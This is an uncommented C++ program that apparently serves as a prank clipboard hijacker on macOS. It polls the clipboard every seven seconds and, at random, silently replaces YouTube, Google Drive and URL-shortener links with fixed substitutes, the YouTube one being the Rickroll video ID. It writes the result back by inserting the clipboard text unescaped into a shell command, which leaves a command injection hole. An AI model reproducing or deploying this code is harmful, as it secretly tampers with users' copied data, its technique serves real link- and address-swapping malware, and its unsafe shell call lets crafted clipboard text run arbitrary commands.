
#include <unistd.h>

#include <cstdio>

#include <iostream>

#include <memory>

#include <string>

#include <array>

#include <signal.h>

#include <stdlib.h>

#include <cstdlib>

#include <stdio.h>

#include <regex>

using namespace std;

std::string exec(const char * cmd) {
  std::array < char, 128 > buffer;
  std::string result;
  std::unique_ptr < FILE, decltype( & pclose) > pipe(popen(cmd, "r"), pclose);
  if (!pipe) {
    throw std::runtime_error("popen() failed!");
  }
  while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
    result += buffer.data();
  }
  return result;
}

int main(){

while (1 == 1){
string clip = exec("pbpaste");
if ((rand() % 7) == 1) {

std::regex long_r ("(youtube.com/watch\\?v=)[a-zA-Z0-9\-\_]{11}");
clip = regex_replace(clip, long_r, "$1dQw4w9WgXcQ");

std::regex short_r ("(youtu.be/)[a-zA-Z0-9\-\_]{11}");
clip = regex_replace(clip, short_r, "$1dQw4w9WgXcQ");

std::regex googledrive ("(drive.google.com/file/d/)[a-zA-Z0-9\-\_]{28}");
clip = regex_replace(clip, googledrive, "$010B7g1h4sDEtjuZy1lWDBmTlBwZlk");

std::regex tinyurl ("(http://tinyurl.com/)[a-zA-Z0-9\-\_]{6}");
clip = regex_replace(clip, tinyurl, "$012g9mqh");

std::regex alturl ("(alturl.com/)[a-zA-Z0-9\-\_]{5}");
clip = regex_replace(clip, alturl, "$01p749b");

std::regex bitly ("(bit.ly/)[a-zA-Z0-9\-\_]{7}");
clip = regex_replace(clip, bitly, "$013bwvRSg");

exec(string("printf \"" + clip+ "\"| pbcopy").c_str());
}
sleep(7);

}

}